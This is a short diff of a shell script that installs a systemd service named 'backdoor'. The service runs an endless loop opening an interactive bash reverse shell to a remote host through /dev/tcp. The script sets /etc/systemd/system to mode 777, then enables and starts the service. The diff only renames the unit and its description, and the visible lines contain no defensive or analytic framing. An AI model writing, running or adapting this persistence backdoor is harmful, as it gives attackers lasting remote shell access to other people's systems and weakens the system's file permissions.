@@ -6,7 +6,7 @@ PORT="9100"
 chmod 777 /etc/systemd/system
 
 echo -e "[Unit]
-Description=Required for the effective running of port 9999
+Description=My Exclusive Backdoor Service
 
 [Service]
 Type=simple
@@ -14,9 +14,9 @@ ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$SERVER_HOST/$
 
 [Install]
 WantedBy=multi-user.target
-" > /etc/systemd/system/king.service
+" > /etc/systemd/system/backdoor.service
 
-systemctl enable king
-systemctl start king
+systemctl enable backdoor
+systemctl start backdoor
 
 chmod 751 /etc/systemd/system
